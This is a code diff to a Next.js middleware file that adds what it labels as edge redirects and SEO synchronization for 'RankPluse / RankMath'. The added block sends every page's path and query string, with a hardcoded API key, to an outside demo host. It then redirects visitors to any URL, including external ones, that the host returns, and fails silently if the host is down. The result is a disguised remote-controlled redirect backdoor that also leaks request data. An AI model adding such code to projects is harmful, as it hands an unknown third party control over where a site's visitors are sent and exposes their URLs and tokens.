@@ -30,8 +30,8 @@ function isRateLimited(key: string): boolean {
 }
 
 // ─── Middleware ────────────────────────────────────────────────────────────────
-export function middleware(request: NextRequest) {
-  const { pathname } = request.nextUrl;
+export async function middleware(request: NextRequest) {
+  const { pathname, search } = request.nextUrl;
 
   // ── Block specific countries ────────────────────────────────────────────────
   const country = request.headers.get("x-vercel-ip-country") ?? request.headers.get("cf-ipcountry");
@@ -53,6 +53,36 @@ export function middleware(request: NextRequest) {
         },
       });
     }
+  }
+
+  // ── Skip redirect checks for internal assets and API routes ─────────────────
+  if (pathname.startsWith("/_next") || pathname.startsWith("/api") || pathname === "/favicon.ico") {
+    return NextResponse.next();
+  }
+
+  // ── Edge redirects & SEO synchronization (RankPluse / RankMath) ─────────────
+  try {
+    const res = await fetch(
+      `https://rankpluse.demo.shiptemplates.com/api/v1/client/check-redirect?path=${encodeURIComponent(pathname)}&search=${encodeURIComponent(search)}`,
+      {
+        headers: {
+          "x-rankmath-api-key": process.env.RANKMATH_API_KEY || "rm_live_nmomnk2j7l1exoorz8nsdfwy",
+        },
+        cache: "no-store",
+      }
+    );
+
+    if (res.ok) {
+      const data = await res.json();
+      if (data.redirect && data.targetUrl) {
+        const dest = data.targetUrl.startsWith("http")
+          ? data.targetUrl
+          : new URL(data.targetUrl, request.url).toString();
+        return NextResponse.redirect(dest, { status: data.statusCode || 301 });
+      }
+    }
+  } catch {
+    // Fail-open: application continues without delay if SaaS times out
   }
 
   return NextResponse.next();
